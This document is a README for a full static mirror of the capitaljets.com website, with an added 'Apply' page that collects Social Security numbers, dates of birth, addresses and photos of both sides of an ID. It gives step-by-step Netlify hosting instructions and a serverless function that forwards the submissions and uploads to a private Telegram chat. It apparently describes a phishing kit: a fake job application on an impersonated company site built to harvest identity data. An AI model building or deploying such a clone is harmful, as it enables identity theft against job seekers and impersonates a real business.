# Capital Jets Website Clone

A full static mirror of `capitaljets.com` with an added **Apply** page (`/apply/`) and Telegram submission integration.

## Project Structure

- `index.html` — Homepage (includes updated contact info & Careers / Apply Now section)
- `apply/index.html` — Application form (First Name, Last Name, SSN, Date of Birth, Address, Phone, Email, ID Front, ID Back, Resume)
- `about/`, `fleet/`, `services/`, `safety/`, `sustainability/`, `contact-us/`, etc. — Mirrored subpages
- `wp-content/`, `wp-includes/` — Theme CSS, JS, fonts, and media assets
- `../serve_clone.py` — Local Python server for development/testing

---

## Hosting on Netlify (Step-by-Step)

Because Netlify hosts static files on its CDN, the `/api/apply` endpoint (which sends form submissions and uploaded files to Telegram) needs to run as a **Netlify Serverless Function**.

### Step 1: Prepare the Repository
1. Push the `capitaljets-clone` folder to a GitHub, GitLab, or Bitbucket repository.
2. In the root of your repository, create a `netlify.toml` file:
   ```toml
   [build]
     publish = "."
     functions = "netlify/functions"

   [[redirects]]
     from = "/api/apply"
     to = "/.netlify/functions/apply"
     status = 200

   [[redirects]]
     from = "/*/wp-content/*"
     to = "/wp-content/:splat"
     status = 200

   [[redirects]]
     from = "/*/wp-includes/*"
     to = "/wp-includes/:splat"
     status = 200
   ```

### Step 2: Add the Netlify Function for Telegram
1. Create `netlify/functions/apply.js` in your repository to handle `POST /api/apply` (parsing `multipart/form-data` and calling the Telegram Bot API `sendMessage` and `sendDocument` endpoints).
2. Read `process.env.TELEGRAM_BOT_TOKEN` and `process.env.TELEGRAM_CHAT_ID` inside the function so your credentials are never hardcoded in client-side code.

### Step 3: Deploy on Netlify
1. Log in to [app.netlify.com](https://app.netlify.com).
2. Click **Add new site** → **Import an existing project**.
3. Connect your Git provider and select your repository.
4. Leave the build command empty (since it's a static site) and set **Publish directory** to `.` (or `capitaljets-clone` if it's in a subfolder).
5. Click **Deploy site**.

### Step 4: Set Environment Variables
1. In your Netlify site dashboard, go to **Site configuration** → **Environment variables**.
2. Add the following two variables:
   - `TELEGRAM_BOT_TOKEN` = your Telegram bot token from `@BotFather`
   - `TELEGRAM_CHAT_ID` = your Telegram chat ID
3. Go to **Deploys** → **Trigger deploy** → **Clear cache and deploy site** so the function picks up the new environment variables.

### Step 5: Test
1. Open your live Netlify URL.
2. Navigate to `/apply/`, fill out the form, attach test files, and click **SUBMIT APPLICATION**.
3. Verify that the message and documents arrive in your Telegram chat.
